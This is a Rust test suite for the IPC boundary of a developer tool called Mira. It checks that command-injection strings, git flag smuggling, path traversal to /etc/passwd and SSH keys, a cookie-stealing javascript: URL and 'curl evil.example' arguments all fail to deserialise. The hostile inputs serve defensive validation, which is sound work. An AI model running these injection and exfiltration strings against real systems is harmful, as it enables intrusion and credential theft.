//! What the interface is able to *say*.
//!
//! The guards next door assert that no command has a parameter for a program, a
//! path or a URL. These assert the other half: that the parameters which do
//! exist admit nothing but the values they are meant to.
//!
//! This is the boundary a compromised page would attack. It is a `serde`
//! deserialisation, so the test is a deserialisation — the same code, with the
//! same input, that an `invoke` would reach (`security-and-privacy.md` §5).

use mira_core::AppKind;
use mira_platform::{plan, LaunchTarget, Os};
use serde_json::json;

/// The one enum a launch is asked for by.
fn kind(raw: serde_json::Value) -> Result<AppKind, serde_json::Error> {
    serde_json::from_value(raw)
}

#[test]
fn a_kind_is_one_of_exactly_three_words() {
    for accepted in ["editor", "terminal", "browser"] {
        assert!(kind(json!(accepted)).is_ok(), "{accepted} must deserialise");
    }
    assert_eq!(AppKind::ALL.len(), 3, "and there are no others");
}

#[test]
fn nothing_that_looks_like_a_command_is_a_kind() {
    // Every one of these is what an attacker would try to put where the kind
    // goes. None of them is a variant, so none of them survives the wire.
    for refused in [
        json!("/bin/sh"),
        json!("code --wait /etc"),
        json!("open"),
        json!("Editor"),
        json!("editor; rm -rf ~"),
        json!(0),
        json!(["editor"]),
        json!({ "editor": "/bin/sh" }),
        json!(null),
    ] {
        assert!(
            kind(refused.clone()).is_err(),
            "{refused} must not deserialise into a kind"
        );
    }
}

#[test]
fn a_launch_target_cannot_be_sent_at_all() {
    // The type that carries a path or an address is not `Deserialize`, so it
    // cannot appear in a command signature even by accident. This test is here
    // to fail the day someone derives it.
    //
    // Compile-time, expressed as a fact: `LaunchTarget` is constructed in Rust
    // from a project row or from an observed port, and there is no third way.
    let from_a_row = LaunchTarget::Directory("/home/dev/aviora".into());
    let from_a_port = LaunchTarget::WebAddress("http://localhost:3000".to_owned());

    assert_ne!(from_a_row, from_a_port);
}

#[test]
fn an_address_that_is_not_a_web_address_is_refused_before_anything_opens() {
    for refused in [
        "file:///etc/passwd",
        "file:///Users/dev/.ssh/id_rsa",
        "javascript:fetch('http://evil.test/'+document.cookie)",
        "data:text/html,<script>alert(1)</script>",
        "vscode://file/etc/passwd",
        "smb://192.168.1.1/share",
        "HTTP://localhost:3000",
    ] {
        let attempt = plan(
            Os::MacOs,
            AppKind::Browser,
            None,
            LaunchTarget::WebAddress(refused.to_owned()),
            |_| true,
        );
        assert!(
            matches!(attempt, Err(mira_core::MiraError::Invalid { .. })),
            "{refused} must be refused, got {attempt:?}"
        );
    }
}

#[test]
fn the_only_addresses_the_product_can_build_are_loopback() {
    // `live.open_service` takes a `u16`, so the reachable set of addresses is
    // the whole of `http://localhost:0`..`:65535` and nothing else. Spot-checked
    // at both ends and asserted for shape.
    for port in [0_u16, 1, 3000, 8080, u16::MAX] {
        let built = format!("http://localhost:{port}");
        assert!(mira_platform::is_openable(&built));
        assert!(plan(
            Os::MacOs,
            AppKind::Browser,
            None,
            LaunchTarget::WebAddress(built),
            |_| true
        )
        .is_ok());
    }
}

// ── Naming a commit ──────────────────────────────────────────────────────────

/// The one Git value the interface may speak.
fn commit(raw: serde_json::Value) -> Result<mira_git::CommitId, serde_json::Error> {
    serde_json::from_value(raw)
}

#[test]
fn a_commit_id_is_hexadecimal_and_nothing_else() {
    for accepted in [
        "ad50fc7",
        "ad50",
        "AD50FC7",
        "ad50fc71f70b122469a9772cb772dc86b2c83521",
    ] {
        assert!(
            commit(json!(accepted)).is_ok(),
            "{accepted} must deserialise"
        );
    }
}

#[test]
fn nothing_that_git_would_treat_as_an_argument_is_a_commit_id() {
    // Mira does not run `git` — it links libgit2, and there is no command line
    // anywhere (ADR-0009). This is the wall that would still hold if it did: a
    // revision, a path, a flag, a refspec and a metacharacter all fail on the
    // wire, before any code sees them.
    for refused in [
        json!("HEAD"),
        json!("HEAD~1"),
        json!("HEAD^{commit}"),
        json!("main"),
        json!("refs/heads/main"),
        json!("@{upstream}"),
        json!("--all"),
        json!("--upload-pack=/bin/sh"),
        json!("-c core.sshCommand=/bin/sh"),
        json!("--output=/etc/passwd"),
        json!("../../../etc/passwd"),
        json!("/Users/dev/.ssh/id_rsa"),
        json!("ad50fc7; rm -rf ~"),
        json!("ad50fc7 && id"),
        json!("$(id)"),
        json!("`id`"),
        json!("ad50fc7\n--exec=id"),
        json!(""),
        json!("ad5"),
        json!("ad50fc71f70b122469a9772cb772dc86b2c835211"),
        json!("zzzzzzz"),
        json!(0),
        json!(["ad50fc7"]),
        json!({ "sha": "ad50fc7" }),
        json!(null),
    ] {
        assert!(
            commit(refused.clone()).is_err(),
            "{refused} must not deserialise into a commit id"
        );
    }
}

#[test]
fn a_commit_id_can_never_be_long_enough_to_carry_a_payload() {
    // Forty hexadecimal characters is the whole space. There is no length at
    // which this becomes a channel for something else.
    for length in [41usize, 100, 4096] {
        assert!(commit(json!("a".repeat(length))).is_err());
    }
}

// ── Naming a span ────────────────────────────────────────────────────────────

fn span(raw: serde_json::Value) -> Result<mira_platform::KeepAwakeSpan, serde_json::Error> {
    serde_json::from_value(raw)
}

#[test]
fn a_keep_awake_span_is_one_of_exactly_four_words() {
    for accepted in ["off", "thirtyMinutes", "oneHour", "untilTurnedOff"] {
        assert!(span(json!(accepted)).is_ok(), "{accepted} must deserialise");
    }
    assert_eq!(mira_platform::KeepAwakeSpan::ALL.len(), 4);
}

#[test]
fn no_duration_can_be_sent_where_a_span_goes() {
    // The interface cannot ask to be kept awake for a week, because it cannot ask
    // for a number at all. That is the whole bound on this feature: an hour, and
    // then a person has to choose again (ADR-0014).
    for refused in [
        json!(0),
        json!(3600),
        json!(u64::MAX),
        json!(-1),
        json!("1h"),
        json!("forever"),
        json!("Off"),
        json!({ "minutes": 999_999 }),
        json!(["oneHour"]),
        json!(true),
        json!(null),
    ] {
        assert!(
            span(refused.clone()).is_err(),
            "{refused} must not deserialise into a span"
        );
    }
}

// ── What may be copied ───────────────────────────────────────────────────────

#[test]
fn the_clipboard_never_accepts_anything_but_a_short_single_line_fact() {
    // The value is resolved from the repository, not sent — but the platform
    // layer refuses anything of the wrong shape anyway, so a future caller cannot
    // turn copy-a-commit into copy-a-file.
    assert!(mira_platform::is_copyable("ad50fc7"));
    assert!(mira_platform::is_copyable(
        "ad50fc71f70b122469a9772cb772dc86b2c83521"
    ));

    for refused in [
        "",
        "ad50fc7\nrm -rf ~",
        "ad50fc7\r\nid",
        "ad50fc7\u{0}",
        " ad50fc7",
    ] {
        assert!(
            !mira_platform::is_copyable(refused),
            "{refused:?} must not be copyable"
        );
    }

    assert!(
        !mira_platform::is_copyable(&"a".repeat(1024)),
        "a file's worth of text must not be copyable"
    );
}

// ── Naming a change set ──────────────────────────────────────────────────────

fn scope(raw: serde_json::Value) -> Result<mira_git::DiffScope, serde_json::Error> {
    serde_json::from_value(raw)
}

#[test]
fn a_diff_scope_is_one_commit_or_the_working_tree() {
    assert!(scope(json!({ "kind": "workingTree" })).is_ok());
    assert!(scope(json!({ "kind": "commit", "commit": "ad50fc7" })).is_ok());
    assert!(scope(json!({
        "kind": "commit",
        "commit": "ad50fc71f70b122469a9772cb772dc86b2c83521"
    }))
    .is_ok());
}

#[test]
fn nothing_that_is_not_a_commit_survives_inside_a_scope() {
    // The scope is the second place a commit crosses the boundary, so it is the
    // second place the same wall has to stand. Nesting a value does not launder
    // it: `CommitId` validates wherever it is deserialised.
    for refused in [
        json!({ "kind": "commit", "commit": "HEAD" }),
        json!({ "kind": "commit", "commit": "refs/heads/main" }),
        json!({ "kind": "commit", "commit": "--output=/etc/passwd" }),
        json!({ "kind": "commit", "commit": "../../../etc/passwd" }),
        json!({ "kind": "commit", "commit": "ad50fc7; rm -rf ~" }),
        json!({ "kind": "commit", "commit": "" }),
        json!({ "kind": "commit", "commit": 0 }),
        json!({ "kind": "commit" }),
        json!({ "kind": "index" }),
        json!({ "kind": "path", "path": "/etc/passwd" }),
        json!("workingTree"),
        json!("/etc/passwd"),
        json!(null),
        json!([]),
    ] {
        assert!(
            scope(refused.clone()).is_err(),
            "{refused} must not deserialise into a scope"
        );
    }

    // Extra keys are the one shape serde accepts, and it *ignores* them rather
    // than honouring them — which is the property that matters. A path bolted
    // onto a scope reaches nothing, because nothing downstream reads one.
    assert_eq!(
        scope(json!({ "kind": "workingTree", "commit": "ad50fc7" })).expect("a scope"),
        mira_git::DiffScope::WorkingTree,
        "a stray key must not turn a working-tree read into a commit read"
    );
    assert_eq!(
        scope(json!({ "kind": "commit", "commit": "ad50fc7", "path": "/etc/passwd" }))
            .expect("a scope"),
        mira_git::DiffScope::Commit {
            commit: "ad50fc7".parse().expect("a commit id")
        },
        "a stray path must be dropped, not carried"
    );
}

#[test]
fn a_file_is_chosen_by_its_place_in_a_list_and_never_by_a_path() {
    // The whole file-selection contract, at the boundary. `at` is a `u32`, so the
    // entire space of things the interface can ask for is "the nth change Mira
    // listed" — and Mira lists at most `MAX_FILES` of them.
    for accepted in [0u32, 1, 199, u32::MAX] {
        assert!(serde_json::from_value::<u32>(json!(accepted)).is_ok());
    }

    // Everything somebody would send if they wanted a path instead.
    for refused in [
        json!("src/app.ts"),
        json!("/etc/passwd"),
        json!("../../../etc/passwd"),
        json!("*"),
        json!(-1),
        json!(1.5),
        json!(null),
        json!({ "path": "src/app.ts" }),
        json!(["src/app.ts"]),
    ] {
        assert!(
            serde_json::from_value::<u32>(refused.clone()).is_err(),
            "{refused} must not deserialise into an ordinal"
        );
    }

    // And an ordinal past what Mira lists reads nothing at all — asserted in
    // `mira-git`'s own suite, because it is a property of the read rather than of
    // the wire.
    assert!(mira_git::MAX_FILES < u32::MAX as usize);
}

#[test]
fn the_diff_limits_are_the_only_thing_that_decides_how_much_is_read() {
    // No command carries a number that could raise them, so these constants are
    // the whole story about how much one request can cost.
    assert_eq!(mira_git::MAX_FILES, 200);
    assert_eq!(mira_git::MAX_LINES, 2_000);
    assert_eq!(mira_git::MAX_BYTES, 256 * 1024);
    assert_eq!(mira_git::MAX_LINE_BYTES, 2_000);
    assert_eq!(mira_git::MAX_FILE_BYTES, 2 * 1024 * 1024);
}

// ── Naming a search ──────────────────────────────────────────────────────────

fn term(raw: serde_json::Value) -> Result<mira_git::Term, serde_json::Error> {
    serde_json::from_value(raw)
}

fn filter(raw: serde_json::Value) -> Result<mira_git::HistoryFilter, serde_json::Error> {
    serde_json::from_value(raw)
}

#[test]
fn a_filter_term_is_one_short_line_of_text() {
    for accepted in ["Grace Hopper", "widget", "fix:", "Ångström", "  trimmed  "] {
        assert!(term(json!(accepted)).is_ok(), "{accepted} must deserialise");
    }
}

#[test]
fn nothing_that_could_be_a_payload_is_a_filter_term() {
    // A term is compared in Rust and never reaches Git, so this is defence in
    // depth rather than the only wall — but a value that can carry a newline is
    // a value somebody will eventually try to put somewhere it matters.
    for refused in [
        json!(""),
        json!("   "),
        json!("two\nlines"),
        json!("carriage\rreturn"),
        json!("null\u{0}byte"),
        json!("x".repeat(201)),
        json!(0),
        json!(true),
        json!(null),
        json!(["widget"]),
        json!({ "contains": "widget" }),
    ] {
        assert!(
            term(refused.clone()).is_err(),
            "{refused} must not deserialise into a filter term"
        );
    }
}

#[test]
fn a_branch_filter_is_a_commit_id_and_never_a_ref_name() {
    // The whole reason a ref name never crosses the boundary: there is nowhere
    // for one to go. `main`, `refs/heads/main` and `HEAD` are not commit ids.
    assert!(filter(json!({ "branch": "ad50fc7" })).is_ok());
    assert!(filter(json!({})).is_ok(), "an empty filter is legal");

    for refused in [
        json!({ "branch": "main" }),
        json!({ "branch": "refs/heads/main" }),
        json!({ "branch": "HEAD" }),
        json!({ "branch": "origin/main" }),
        json!({ "branch": "v1.0" }),
        json!({ "branch": "@{upstream}" }),
        json!({ "branch": "main..dev" }),
        json!({ "branch": "--all" }),
    ] {
        assert!(
            filter(refused.clone()).is_err(),
            "{refused} must not deserialise into a filter"
        );
    }
}

#[test]
fn no_pathspec_or_glob_can_be_sent_as_a_file_filter() {
    // A file is a change-set position, so a pattern has nowhere to live.
    for refused in [
        json!({ "file": "src/app.ts" }),
        json!({ "file": "src/**/*.ts" }),
        json!({ "file": "*.rs" }),
        json!({ "file": { "path": "src/app.ts" } }),
        json!({ "file": { "scope": { "kind": "workingTree" } } }),
        json!({ "file": { "scope": { "kind": "commit", "commit": "HEAD" }, "at": 0, "before": false } }),
    ] {
        assert!(
            filter(refused.clone()).is_err(),
            "{refused} must not deserialise into a filter"
        );
    }

    assert!(
        filter(json!({
            "file": { "scope": { "kind": "workingTree" }, "at": 3, "before": false }
        }))
        .is_ok(),
        "a change-set position is the only way to name a file"
    );
}

#[test]
fn a_filter_admits_no_field_that_git_would_interpret() {
    // Unknown keys are ignored by serde rather than honoured, which is the safe
    // half — but the point is that there is no field here that *would* be read as
    // a revision, a pathspec or a flag even if one arrived.
    let smuggled = filter(json!({
        "branch": "ad50fc7",
        "pathspec": "src/**",
        "glob": "*.rs",
        "args": ["--all"],
        "rev": "HEAD~5"
    }))
    .expect("a filter");

    assert_eq!(
        smuggled,
        mira_git::HistoryFilter {
            branch: Some("ad50fc7".parse().expect("a commit id")),
            ..mira_git::HistoryFilter::default()
        },
        "every stray key is dropped, not carried"
    );
}

#[test]
fn the_search_budget_is_the_only_thing_that_decides_how_far_it_looks() {
    assert_eq!(mira_git::MAX_FILTER_SCAN, 2_000);
    assert_eq!(mira_git::MAX_AUTHORS, 100);
    assert_eq!(mira_git::LONGEST_TERM, 200);
}

// ── Naming an application ────────────────────────────────────────────────────

fn app_id(raw: serde_json::Value) -> Result<mira_core::AppId, serde_json::Error> {
    serde_json::from_value(raw)
}

#[test]
fn an_application_id_is_a_slug_and_nothing_else() {
    for accepted in ["vscode", "iterm", "sublime-text", "zed", "xterm", "wezterm"] {
        assert!(
            app_id(json!(accepted)).is_ok(),
            "{accepted} must deserialise"
        );
    }
}

#[test]
fn nothing_that_could_be_run_deserialises_as_an_application_id() {
    // Defence in depth. The wall is that an id only becomes an application by
    // being found in the catalogue compiled into the binary — but a type that
    // cannot hold a path is a type nobody has to check for one.
    for refused in [
        json!("/usr/bin/code"),
        json!("/Applications/Cursor.app"),
        json!("C:\\Windows\\System32\\cmd.exe"),
        json!("code --wait"),
        json!("code;rm -rf ~"),
        json!("../../etc/passwd"),
        json!("Visual Studio Code"),
        json!("VSCode"),
        json!("code\nzed"),
        json!("vscode "),
        json!(""),
        json!("x".repeat(33)),
        json!(0),
        json!(true),
        json!(null),
        json!(["vscode"]),
        json!({ "program": "code" }),
    ] {
        assert!(
            app_id(refused.clone()).is_err(),
            "{refused} must not deserialise into an application id"
        );
    }
}

#[test]
fn a_well_formed_id_for_an_application_mira_does_not_know_resolves_to_nothing() {
    // The half validation cannot do. `code` and `sh` are perfectly good slugs;
    // they name no row, so they become nothing at all.
    for unknown in ["code", "sh", "env", "bash", "some-editor"] {
        let parsed: mira_core::AppId = unknown.parse().expect("a well-formed id");

        for kind in mira_core::AppKind::ALL {
            for os in [
                mira_platform::Os::MacOs,
                mira_platform::Os::Windows,
                mira_platform::Os::Linux,
            ] {
                assert!(
                    mira_platform::find(os, kind, &parsed).is_none(),
                    "{unknown} resolved to a {kind:?} on {os:?}"
                );
            }
        }
    }
}

#[test]
fn a_preference_carries_no_program_and_no_path() {
    let preference: mira_core::AppPreference = serde_json::from_value(json!({
        "kind": "editor",
        "application": "zed",
        "program": "/usr/bin/zed",
        "args": ["--wait"],
        "path": "/home/dev"
    }))
    .expect("a preference");

    assert_eq!(preference.kind, mira_core::AppKind::Editor);
    assert_eq!(preference.application.as_str(), "zed");

    let written = serde_json::to_string(&preference).expect("serialise");
    assert!(!written.contains("/usr/bin"), "got: {written}");
    assert!(!written.contains("--wait"), "got: {written}");
    assert!(!written.contains("/home/dev"), "got: {written}");
}

// ── Workspace services (slice 4c) ────────────────────────────────────────────

/// A port, as it would arrive from a page.
fn port(raw: serde_json::Value) -> Result<mira_core::service::Port, serde_json::Error> {
    serde_json::from_value(raw)
}

#[test]
fn a_port_is_a_number_between_one_and_sixty_five_thousand() {
    for accepted in [1, 80, 3_000, 5_173, 65_535] {
        assert!(port(json!(accepted)).is_ok(), "{accepted} must deserialise");
    }
}

#[test]
fn nothing_that_is_not_a_port_is_a_port() {
    for refused in [
        // Zero means "any port" — a request rather than an address, and never
        // something to watch.
        json!(0),
        json!(-1),
        json!(65_536),
        json!(1_000_000),
        json!("3000"),
        json!("3000; rm -rf ~"),
        json!("http://localhost:3000"),
        json!(3000.5),
        json!(null),
        json!([3000]),
        json!({ "port": 3000 }),
    ] {
        assert!(
            port(refused.clone()).is_err(),
            "{refused} must not deserialise into a port"
        );
    }
}

#[test]
fn a_service_is_named_by_a_row_id_and_never_by_what_is_behind_it() {
    // `workspaces.open_service` and `workspaces.forget_service` take a
    // `WorkspaceServiceId`. It is a row id: naming one that is not yours is
    // `NotFound`, not access to anything.
    let id: mira_core::WorkspaceServiceId = serde_json::from_value(json!(7)).expect("a row id");
    assert_eq!(id.get(), 7);

    for refused in [
        json!("7"),
        json!("http://localhost:3000"),
        json!({ "port": 3000 }),
        json!({ "id": 7, "port": 3000 }),
        json!(null),
    ] {
        assert!(
            serde_json::from_value::<mira_core::WorkspaceServiceId>(refused.clone()).is_err(),
            "{refused} must not deserialise into a service id"
        );
    }
}

#[test]
fn a_forged_service_state_cannot_smuggle_something_to_run() {
    // `ServiceState` travels outward, but a struct that deserialises is a struct
    // a page could try to hand back. Every variant is a fixed shape, and none of
    // them has a field an executable, an argv or a URL could live in.
    let running: mira_core::service::ServiceState = serde_json::from_value(json!({
        "kind": "running",
        "address": "127.0.0.1",
        "process": "node",
        "pid": 4_242,
        "executable": "/bin/sh",
        "command": "rm -rf ~",
        "argv": ["-c", "curl evil"],
        "url": "file:///etc/passwd"
    }))
    .expect("a state");

    assert_eq!(
        running,
        mira_core::service::ServiceState::Running {
            address: "127.0.0.1".to_owned(),
            process: Some("node".to_owned()),
            pid: Some(4_242),
            cpu_share: None,
            memory_bytes: None,
            uptime_seconds: None,
        },
        "every stray key is dropped, not carried — including the command line"
    );
}

#[test]
fn a_watched_service_carries_a_port_and_three_ids_and_nothing_else() {
    let watched: mira_core::service::WatchedService = serde_json::from_value(json!({
        "id": 1,
        "workspaceId": 2,
        "port": 5_173,
        "addedAt": 1_800_000_000,
        "label": "web",
        "scheme": "https",
        "path": "@example.invalid/",
        "process": "node",
        "pid": 99
    }))
    .expect("a watched service");

    assert_eq!(watched.port.get(), 5_173);
    assert_eq!(watched.workspace_id.get(), 2);
    assert_eq!(watched.added_at, 1_800_000_000);

    // Re-serialised, it is four fields. A `path` that survived here would be a
    // path Mira could later concatenate into an address, which is the shape
    // `expected_ports` was left empty to avoid.
    let back = serde_json::to_value(watched).expect("serialise");
    let object = back.as_object().expect("an object");
    assert_eq!(object.len(), 4, "got {object:#?}");
    for absent in ["label", "scheme", "path", "process", "pid"] {
        assert!(
            !object.contains_key(absent),
            "{absent} survived: {object:#?}"
        );
    }
}

#[test]
fn a_stored_port_that_is_not_a_port_never_becomes_one() {
    // The database `CHECK` makes this unreachable through Mira; a hand-edited
    // file is where it would come from. `Port::try_from` is the one gate, and it
    // is the same gate the wire uses.
    for refused in [0_i64, -1, 65_536, i64::MAX] {
        assert!(
            mira_core::service::Port::try_from(refused).is_err(),
            "{refused} must not become a port"
        );
    }
    assert_eq!(
        mira_core::service::Port::try_from(5_173_i64)
            .expect("a port")
            .get(),
        5_173
    );
}

// ── Naming an action (slice 4d) ──────────────────────────────────────────────

/// An action id, as it would arrive from a page.
fn action_id(raw: serde_json::Value) -> Result<mira_core::ActionId, serde_json::Error> {
    serde_json::from_value(raw)
}

#[test]
fn an_action_id_is_a_catalogue_slug_and_nothing_else() {
    for accepted in [
        "open-editor",
        "open-terminal",
        "reveal-project",
        "refresh",
        "mark-opened",
    ] {
        assert!(
            action_id(json!(accepted)).is_ok(),
            "{accepted} must deserialise"
        );
    }
}

#[test]
fn nothing_that_could_be_run_deserialises_as_an_action_id() {
    // Every one of these is what somebody would put where the action goes if
    // they were trying to make Mira run something. None survives the wire.
    for refused in [
        json!("npm run dev"),
        json!("pnpm -w build"),
        json!("cargo run --release"),
        json!("yarn start && curl evil.example"),
        json!("/bin/sh"),
        json!("/usr/bin/env node"),
        json!("sh -c 'rm -rf ~'"),
        json!("open-editor; rm -rf ~"),
        json!("open-editor && echo"),
        json!("open-editor | tee"),
        json!("open-editor`whoami`"),
        json!("open-editor$(id)"),
        json!("../../etc/passwd"),
        json!("Open-Editor"),
        json!("open editor"),
        json!("open\neditor"),
        json!("open\u{0}editor"),
        json!(""),
        json!("x".repeat(33)),
        json!(0),
        json!(true),
        json!(null),
        json!(["open-editor"]),
        json!({ "program": "code" }),
    ] {
        assert!(
            action_id(refused.clone()).is_err(),
            "{refused} must not deserialise into an action id"
        );
    }
}

#[test]
fn a_well_formed_id_for_an_action_mira_does_not_have_resolves_to_nothing() {
    // The half validation cannot do. `run`, `build` and `deploy` are perfectly
    // good slugs; they name no catalogue row, so they become nothing at all.
    for unknown in [
        "run",
        "build",
        "deploy",
        "test",
        "start",
        "npm-run-dev",
        "some-action",
    ] {
        let parsed: mira_core::ActionId = unknown.parse().expect("a well-formed id");
        assert!(
            mira_core::action::find(&parsed).is_none(),
            "{unknown} resolved to an action"
        );
    }

    // And every catalogue id does resolve, so this is not passing vacuously.
    for action in mira_core::CATALOGUE {
        let parsed: mira_core::ActionId = action.id.parse().expect("a catalogue id");
        assert!(mira_core::action::find(&parsed).is_some());
    }
}

#[test]
fn a_forged_effect_cannot_smuggle_something_to_run() {
    // `Effect` travels outward, but a type that deserialises is a type a page
    // could try to hand back. Every variant is a fixed shape and none has a
    // field a program, an argument list or a path could live in.
    let open: mira_core::Effect = serde_json::from_value(json!({
        "does": "openIn",
        "kind": "editor",
        "program": "/bin/sh",
        "args": ["-c", "curl evil.example"],
        "cwd": "/",
        "shell": true
    }))
    .expect("an effect");

    assert_eq!(
        open,
        mira_core::Effect::OpenIn {
            kind: mira_core::AppKind::Editor
        },
        "every stray key is dropped, not carried"
    );

    // And there is no variant for running anything, so nothing names one.
    for invented in ["run", "exec", "shell", "script", "spawn", "stop", "kill"] {
        assert!(
            serde_json::from_value::<mira_core::Effect>(json!({ "does": invented })).is_err(),
            "{invented} must not be an effect"
        );
    }
}

#[test]
fn a_forged_action_state_carries_no_instruction() {
    let ready: mira_core::ActionState = serde_json::from_value(json!({
        "kind": "ready",
        "detail": "Visual Studio Code",
        "command": "code .",
        "argv": ["code", "."]
    }))
    .expect("a state");

    assert_eq!(
        ready,
        mira_core::ActionState::Ready {
            detail: Some("Visual Studio Code".to_owned())
        }
    );

    let back = serde_json::to_value(ready).expect("serialise");
    let object = back.as_object().expect("an object");
    assert_eq!(
        object.len(),
        2,
        "kind and detail, nothing else: {object:#?}"
    );
}

#[test]
fn the_catalogue_is_small_and_every_row_says_what_it_does() {
    // The catalogue is the privilege surface, so its size is part of the
    // review. A row without a sentence explaining it is a row somebody would
    // press without knowing what it does.
    assert_eq!(mira_core::CATALOGUE.len(), 6, "the catalogue grew");

    for action in mira_core::CATALOGUE {
        assert!(!action.label.is_empty(), "{} has no label", action.id);
        assert!(
            action.describes.len() > 20,
            "{} does not say what it does: {:?}",
            action.id,
            action.describes
        );
        assert!(!action.icon.is_empty(), "{} has no icon", action.id);
        assert!(
            action.id.parse::<mira_core::ActionId>().is_ok(),
            "{} is not a well-formed id",
            action.id
        );
    }

    // Ids are unique, so one identity never means two things.
    let mut ids: Vec<&str> = mira_core::CATALOGUE.iter().map(|a| a.id).collect();
    ids.sort_unstable();
    let before = ids.len();
    ids.dedup();
    assert_eq!(ids.len(), before, "two catalogue rows share an id");
}

// ── Process detail and the Ports view (slice 2b) ─────────────────────────────

#[test]
fn a_forged_process_fact_cannot_smuggle_a_command_line() {
    // `ProcessFacts` travels outward, but a type that deserialises is a type a
    // page could try to hand back. Every credential-bearing shape somebody would
    // reach for is dropped, because there is no field for it (ADR-0022).
    let facts: mira_processes::ProcessFacts = serde_json::from_value(json!({
        "pid": 4_242,
        "name": "node",
        "executable": "/usr/local/bin/node",
        "parent": 1,
        "workingDirectory": "/home/dev/aviora",
        "cpuShare": 2.5,
        "memoryBytes": 188_743_680u64,
        "uptimeSeconds": 3_600,
        "cmd": ["node", "--inspect", "--db-url=postgres://user:hunter2@host/db"],
        "argv": ["-c", "curl evil.example"],
        "commandLine": "psql --password=hunter2",
        "environ": ["AWS_SECRET_ACCESS_KEY=abc"]
    }))
    .expect("facts");

    assert_eq!(facts.pid, 4_242);
    assert_eq!(facts.cpu_share, Some(2.5));
    assert_eq!(facts.memory_bytes, Some(188_743_680));
    assert_eq!(facts.uptime_seconds, Some(3_600));

    // Re-serialised, it is eight fields and none of them is a command line.
    let back = serde_json::to_value(facts).expect("serialise");
    let object = back.as_object().expect("an object");
    assert_eq!(object.len(), 8, "got {object:#?}");
    for absent in ["cmd", "argv", "commandLine", "environ"] {
        assert!(
            !object.contains_key(absent),
            "{absent} survived: {object:#?}"
        );
    }
    assert!(
        !serde_json::to_string(&back)
            .expect("string")
            .contains("hunter2"),
        "a credential passed in survived the round trip"
    );
}

#[test]
fn no_command_carries_a_pid_a_port_or_a_process_name_for_the_ports_view() {
    // `live.ports` takes nothing at all, and opening still goes through the
    // ordinal. Asserted on the command signatures rather than on prose.
    let source = std::fs::read_to_string(
        std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("src/commands/ports.rs"),
    )
    .expect("ports.rs");

    assert!(
        source.contains("pub fn live_ports(state: State<'_, Arc<AppState>>)"),
        "the Ports view must take nothing but the injected state"
    );
    for forbidden in ["pid:", "port:", "process:", "address:", "url:"] {
        assert!(
            !source.contains(&format!(
                "pub fn live_ports(state: State<'_, Arc<AppState>>, {forbidden}"
            )),
            "the Ports command takes {forbidden}"
        );
    }
}

#[test]
fn a_cpu_share_that_was_never_measured_is_absent_rather_than_zero() {
    // The distinction the whole first-sample rule exists for. `None` and
    // `Some(0.0)` are different claims, and they must survive the wire as
    // different claims.
    let unmeasured: mira_processes::ProcessFacts = serde_json::from_value(json!({
        "pid": 1, "name": "node", "executable": null, "parent": null,
        "workingDirectory": null, "cpuShare": null,
        "memoryBytes": null, "uptimeSeconds": null
    }))
    .expect("facts");
    let idle: mira_processes::ProcessFacts = serde_json::from_value(json!({
        "pid": 1, "name": "node", "executable": null, "parent": null,
        "workingDirectory": null, "cpuShare": 0.0,
        "memoryBytes": null, "uptimeSeconds": null
    }))
    .expect("facts");

    assert_eq!(unmeasured.cpu_share, None);
    assert_eq!(idle.cpu_share, Some(0.0));
    assert_ne!(unmeasured, idle, "not measured is not the same as idle");
}
